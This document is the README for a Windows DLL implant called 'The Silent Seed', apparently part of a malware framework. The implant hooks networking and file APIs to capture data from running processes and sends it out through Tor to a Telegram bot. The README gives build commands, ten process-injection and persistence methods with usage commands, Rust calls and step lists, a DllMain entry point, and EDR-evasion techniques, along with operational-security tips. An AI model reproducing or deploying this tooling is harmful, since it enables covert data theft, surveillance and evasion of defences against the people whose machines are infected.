# Component A: The Silent Seed (Windows)

Windows DLL-based in-memory implant for passive data capture and exfiltration.

**Version**: 3.0.0 - See [CHANGELOG.md](../CHANGELOG.md) for detailed changes.

## Building

```bash
# Build as Windows DLL
cargo build --release --target x86_64-pc-windows-msvc

# Or for 32-bit
cargo build --release --target i686-pc-windows-msvc

# Static linking (recommended for stealth)
cargo build --release --target x86_64-pc-windows-msvc --features static
```

## Overview

The Silent Seed is a Windows DLL that hooks Windows APIs to passively capture data from running processes. It operates entirely in memory and exfiltrates encrypted data via Tor to the Broadcast Engine.

## Implantation Methods

### Method 1: Classic DLL Injection (CreateRemoteThread)

**Description**: Standard DLL injection using `CreateRemoteThread` and `LoadLibrary`.

**Requirements**:
- `PROCESS_ALL_ACCESS` or at minimum: `PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ`
- SeDebugPrivilege (if injecting into processes owned by other users)

**Usage**:
```powershell
# PowerShell
$dll = "C:\Windows\Temp\protosyte.dll"
$pid = (Get-Process -Name "target_app").Id
.\injector.exe --pid $pid --dll $dll
```

**Implementation**:
```rust
use protosyte_seed_windows::injection::InjectionManager;

InjectionManager::inject_dll_classic(
    12345,  // Process ID
    "C:\\Windows\\Temp\\protosyte.dll"
)?;
```

**How it works**:
1. Open target process with `OpenProcess`
2. Allocate memory in target process with `VirtualAllocEx`
3. Write DLL path to allocated memory with `WriteProcessMemory`
4. Get address of `LoadLibraryA` from kernel32.dll (same in all processes)
5. Create remote thread calling `LoadLibraryA` with DLL path
6. DLL loads and `DllMain` executes

**Pros**:
- Well-established technique
- Works with most processes
- Reliable

**Cons**:
- Requires elevated privileges
- Detected by most EDR/AV solutions
- Leaves DLL path in process memory

---

### Method 2: Process Hollowing

**Description**: Create a legitimate process in suspended state, replace its memory with malicious code, then resume execution.

**Requirements**:
- Same privileges as target process
- SeDebugPrivilege (if hollowing system processes)

**Usage**:
```powershell
.\process_hollowing.exe --target "C:\Windows\System32\svchost.exe" --payload "C:\Windows\Temp\protosyte.dll"
```

**Implementation**:
```rust
InjectionManager::process_hollowing(
    "C:\\Windows\\System32\\svchost.exe",
    "C:\\Windows\\Temp\\protosyte.dll"
)?;
```

**How it works**:
1. Create target process with `CREATE_SUSPENDED` flag
2. Read payload into memory
3. Get base address of process image
4. Unmap original image using `NtUnmapViewOfSection` or `ZwUnmapViewOfSection`
5. Allocate new memory at original base address
6. Write payload PE headers and sections
7. Perform relocations
8. Resolve imports
9. Update entry point in thread context
10. Resume thread

**Pros**:
- Process appears legitimate (same name, PID)
- Can bypass some detection mechanisms
- No DLL file path in memory

**Cons**:
- Complex implementation
- May trigger anti-hollowing detection
- Requires PE parsing and manual loading

---

### Method 3: Reflective DLL Injection

**Description**: Load DLL directly from memory without writing to disk or using LoadLibrary.

**Requirements**:
- Same as classic injection
- DLL must be position-independent or relocatable

**Usage**:
```powershell
$dllBytes = [System.IO.File]::ReadAllBytes("C:\Windows\Temp\protosyte.dll")
.\reflective_inject.exe --pid 12345 --dll-bytes $dllBytes
```

**Implementation**:
```rust
let dll_bytes = std::fs::read("protosyte.dll")?;
InjectionManager::reflective_injection(12345, &dll_bytes)?;
```

**How it works**:
1. Parse PE headers from DLL bytes in memory
2. Allocate memory in target process (preferably at preferred base address)
3. Write PE headers to allocated memory
4. Write each section to its virtual address
5. Perform base relocations
6. Resolve imports manually
7. Call `DllMain` entry point

**Reflective Loader Code** (embedded in DLL):
```c
DWORD ReflectiveLoader() {
    // Get base address (current instruction pointer)
    HMODULE hMod = GetModuleHandle(NULL);
    
    // Parse PE headers
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hMod;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hMod + dosHeader->e_lfanew);
    
    // Allocate memory for sections
    // Copy sections
    // Perform relocations
    // Resolve imports
    // Call DllMain
    
    return (DWORD)hMod;
}
```

**Pros**:
- No file on disk
- No LoadLibrary call (harder to detect)
- More stealthy than classic injection

**Cons**:
- Complex PE parsing required
- Must handle relocations and imports manually
- May be detected by memory scanners

---

### Method 4: AppInit_DLLs Registry Injection

**Description**: Use Windows registry to force all processes to load a DLL at startup.

**Requirements**:
- Administrator privileges
- Access to `HKEY_LOCAL_MACHINE`

**Usage**:
```powershell
# Admin PowerShell
.\appinit_registry.exe --dll "C:\Windows\System32\protosyte.dll"
# Reboot required for changes to take effect
```

**Implementation**:
```rust
InjectionManager::appinit_registry(
    "C:\\Windows\\System32\\protosyte.dll"
)?;
```

**Registry Location**:
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows
- AppInit_DLLs = "protosyte.dll"
- LoadAppInit_DLLs = 1 (DWORD)
```

**Pros**:
- System-wide injection (all processes)
- Persistent across reboots
- Automatic injection

**Cons**:
- Requires admin and reboot
- Very easy to detect
- Can cause system instability
- Modern Windows versions limit this feature

---

### Method 5: SetWindowsHookEx Injection

**Description**: Use Windows hooking mechanism to inject DLL into processes.

**Requirements**:
- User-level hooks: No special privileges needed
- System-wide hooks: Administrator privileges

**Usage**:
```powershell
.\hook_injection.exe --dll "C:\Windows\Temp\protosyte.dll" --hook WH_GETMESSAGE
```

**Implementation**:
```rust
InjectionManager::hook_injection(
    "C:\\Windows\\Temp\\protosyte.dll",
    None  // Optional target window HWND
)?;
```

**Hook Types**:
- `WH_GETMESSAGE`: Global message hook
- `WH_KEYBOARD`: Keyboard events
- `WH_MOUSE`: Mouse events
- `WH_CALLWNDPROC`: Window procedure calls

**Pros**:
- User-level hooks don't require admin
- Can target specific windows/threads
- Legitimate Windows API

**Cons**:
- Limited to specific hook types
- May not work with all processes
- System-wide hooks require admin

---

### Method 6: COM Hijacking

**Description**: Register DLL as COM server to automatically load when COM object is instantiated.

**Requirements**:
- Registry write access (user or admin depending on CLSID location)

**Usage**:
```powershell
.\com_hijack.exe --clsid "{00021401-0000-0000-C000-000000000046}" --dll "C:\Windows\Temp\protosyte.dll"
```

**Implementation**:
```rust
InjectionManager::com_hijacking(
    "{00021401-0000-0000-C000-000000000046}",  // CLSID
    "C:\\Windows\\Temp\\protosyte.dll"
)?;
```

**Registry Structure**:
```
HKEY_CURRENT_USER\Software\Classes\CLSID\{CLSID}\InprocServer32
- (Default) = "C:\Windows\Temp\protosyte.dll"
- ThreadingModel = "Apartment"
```

**Common CLSIDs to Hijack**:
- `{00021401-0000-0000-C000-000000000046}`: Shell Link
- `{9BA05972-F6A8-11CF-A442-00A0C90A8F39}`: Shell Application
- `{13709620-C279-11CE-A49E-444553540000}`: Shell Automation

**Pros**:
- Automatic loading when COM object used
- Can be user-level (HKCU) - no admin needed
- Persistent

**Cons**:
- Only loads when COM object instantiated
- Must identify frequently used CLSIDs
- Detectable in registry

---

### Method 7: Early Bird Injection

**Description**: Inject shellcode into process before main thread starts executing.

**Requirements**:
- Same as process creation
- Must be able to create target process

**Usage**:
```powershell
.\early_bird.exe --target "C:\Program Files\App\app.exe" --shellcode payload.bin
```

**Implementation**:
```rust
let shellcode = std::fs::read("payload.bin")?;
InjectionManager::early_bird_injection(
    "C:\\Program Files\\App\\app.exe",
    &shellcode
)?;
```

**How it works**:
1. Create process in suspended state (`CREATE_SUSPENDED`)
2. Allocate memory for shellcode
3. Write shellcode to allocated memory
4. Get thread context
5. Modify instruction pointer (RIP/EIP) to point to shellcode
6. Resume thread - shellcode executes before main()
7. Shellcode calls original entry point

**Pros**:
- Executes before application code
- Can hook from the very beginning
- Difficult to detect

**Cons**:
- Requires process creation capability
- More complex than post-injection
- Must properly restore execution

---

### Method 8: Thread Hijacking

**Description**: Hijack an existing thread in target process to execute shellcode.

**Requirements**:
- `THREAD_ALL_ACCESS` or `THREAD_SET_CONTEXT | THREAD_GET_CONTEXT | THREAD_SUSPEND_RESUME`
- SeDebugPrivilege for other users' threads

**Usage**:
```powershell
$pid = (Get-Process -Name "target").Id
$tid = (Get-Process -Id $pid).Threads[0].Id
.\thread_hijack.exe --pid $pid --tid $tid --shellcode payload.bin
```

**Implementation**:
```rust
let shellcode = std::fs::read("payload.bin")?;
InjectionManager::thread_hijacking(12345, 67890, &shellcode)?;
```

**How it works**:
1. Open target process and thread
2. Suspend thread
3. Allocate memory for shellcode
4. Write shellcode
5. Get thread context (saving original RIP/EIP)
6. Modify context to point to shellcode
7. Resume thread
8. Shellcode executes and restores original execution

**Pros**:
- Works with running processes
- No new threads created
- Can be stealthy

**Cons**:
- Thread suspension may be detected
- Must carefully restore execution
- Complex context manipulation

---

### Method 9: Module Stomping

**Description**: Replace a loaded module's memory with malicious code while keeping module structure.

**Requirements**:
- Same as classic injection
- Module must already be loaded

**Usage**:
```powershell
.\module_stomp.exe --pid 12345 --module "kernel32.dll" --payload payload.bin
```

**Implementation**:
```rust
InjectionManager::module_stomping(
    12345,
    "kernel32.dll",
    &payload_bytes
)?;
```

**How it works**:
1. Enumerate loaded modules in target process
2. Find target module (e.g., kernel32.dll)
3. Unmap original module memory
4. Allocate new memory at same address
5. Write payload to new memory
6. Payload appears to be legitimate module

**Pros**:
- Appears as legitimate module
- Harder to detect
- No new modules loaded

**Cons**:
- May cause crashes if module is in use
- Complex memory management
- Risk of detection

---

### Method 10: Atom Bombing

**Description**: Use Windows Atom Tables to store and communicate shellcode.

**Requirements**:
- Process access (for injection part)
- Atom tables accessible from any process

**Usage**:
```powershell
.\atom_bomb.exe --pid 12345 --shellcode payload.bin
```

**Implementation**:
```rust
InjectionManager::atom_bombing(12345, &shellcode)?;
```

**How it works**:
1. Split shellcode into chunks (atoms have 255 char limit)
2. Store chunks in global atom table with `GlobalAddAtomA`
3. Injected process retrieves atoms and reconstructs shellcode
4. Execute reconstructed shellcode

**Pros**:
- Uses legitimate Windows API
- Can communicate between processes
- Somewhat stealthy

**Cons**:
- Limited by atom size
- Must reconstruct shellcode
- Detectable in atom table

---

## DLL Entry Point

The DLL automatically initializes when loaded:

```rust
#[no_mangle]
#[allow(non_snake_case)]
pub extern "system" fn DllMain(
    hinst_dll: winapi::shared::minwindef::HINSTANCE,
    fdw_reason: winapi::shared::minwindef::DWORD,
    _lpv_reserved: winapi::shared::minwindef::LPVOID,
) -> winapi::shared::minwindef::BOOL {
    match fdw_reason {
        winapi::um::winnt::DLL_PROCESS_ATTACH => {
            // Initialize hooks and exfiltration
            std::thread::spawn(|| {
                if let Err(e) = crate::init_seed() {
                    eprintln!("Initialization failed: {}", e);
                }
            });
            winapi::shared::minwindef::TRUE
        }
        winapi::um::winnt::DLL_PROCESS_DETACH => {
            // Cleanup
            winapi::shared::minwindef::TRUE
        }
        _ => winapi::shared::minwindef::TRUE,
    }
}
```

## Windows-Specific Features

- **API Hooking**: Hooks `WriteFile`, `send`, `InternetWriteFile`, `SSL_write`, etc.
- **Windows Shared Memory**: Uses `CreateFileMapping` for data buffers
- **Tor Detection**: Automatically detects Tor Browser (port 9150) or Tor service (port 9050)
- **Process Hollowing Protection**: Evades detection by anti-hollowing techniques
- **EDR Evasion**: Implements Hell's Gate, Halo's Gate, and other syscall unhooking techniques

## Configuration

Bot token and endpoints via environment variables:
- `PROTOSYTE_BOT_TOKEN`: Telegram bot token
- `PROTOSYTE_PASSPHRASE`: Encryption passphrase

Or via `mission.yaml`:
```yaml
mission:
  id: 0xDEADBEEFCAFEBABE

exfiltration:
  telegram_token: "[from env]"
  interval_seconds: 347
```

## Requirements

- Windows 7+ (x86_64 or i686)
- Tor running (Tor Browser or Tor service)
- Appropriate privileges for chosen injection method
- Visual C++ Redistributables (for MSVC builds)

## Security Considerations

- Most methods require elevated privileges
- EDR/AV solutions detect many injection techniques
- Use anti-detection features (Hell's Gate, process hollowing evasion)
- Follow operational security procedures
- Test in isolated environment first

## Troubleshooting

**Injection fails**:
- Check process privileges (`whoami /priv`)
- Verify process architecture matches DLL (x86 vs x64)
- Ensure SeDebugPrivilege is enabled for cross-user injection

**DLL not loading**:
- Check DLL dependencies (`dumpbin /dependents protosyte.dll`)
- Verify architecture match
- Check Windows Event Viewer for errors

**No data captured**:
- Verify hooks are installed (check hooked functions)
- Verify target process uses hooked APIs
- Check pattern filters in configuration

**Exfiltration fails**:
- Verify Tor is running (`netstat -an | findstr "9050 9150"`)
- Check Windows Firewall rules
- Verify bot token is correct

## Evasion Techniques

See `src/advanced_evasion.rs` for implementation of:
- Hell's Gate / Halo's Gate (syscall unhooking)
- Thread Stack Spoofing
- Module Stomping
- Callback Hell (EDR callback removal)
- Process Ghosting
- Early Bird Injection
- Manual DLL Mapping

## See Also

- `protosyte-seed/README.md` - Linux implantation methods
- `protosyte-seed-macos/README.md` - macOS implantation methods
- `../MISSION_YAML_INTEGRATION.md` - Mission configuration guide
